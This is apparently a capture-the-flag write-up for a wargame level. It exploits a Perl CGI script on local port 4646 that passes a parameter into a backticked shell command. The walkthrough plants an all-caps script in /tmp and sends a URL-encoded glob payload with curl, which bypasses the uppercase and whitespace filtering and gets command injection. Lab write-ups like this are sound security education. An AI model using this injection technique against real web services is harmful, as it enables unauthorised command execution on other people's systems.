# level12
We are greeted with a perl script that seems to be running on port 4646.  
It takes two parameters labeled `x` and `y`, and seems to do some splitting and pattern matching tomfoolery on `x` with `y`.

But what is interesting is that the content of `x` is dumped into a backticked subshell command. We will be exploiting it.

However, before being executed, the content of `x` goes through two transformations, one which brings all alphabetical characters to uppercase, and the other which cuts everything that comes after a whitespace.

So it won't be possible to directly pass `getflag > /tmp/flag` as a parameter.

# Resolution

We will be creating an executable with an all caps name.
```sh
printf '#!/bin/sh\ngetflag > /tmp/flag\n' > /tmp/GETFLAG
chmod +x /tmp/GETFLAG
```

We will then be trying to run the following: `` `egrep "^`/*/GETFLAG`" /tmp/xd 2>&1` ``   
In such a case of nested backticked shellscripts, perl seems to first execute the inner shellscript, as referenced [here](http://www.novosial.org/perl/backticks/index.html).  
This will cause sh to look for an executable called "GETFLAG" in every folder of `/`, and to execute the first it finds, which will hopefully be our script.

So we will just pass the string `` `/*/GETFLAG` `` as a an x parameter to the CGI endpoint, after having URL-encoded it
```sh
curl localhost:4646?x="%60%2F%2A%2FGETFLAG%60"
```

We can then find our flag on `/tmp/flag`.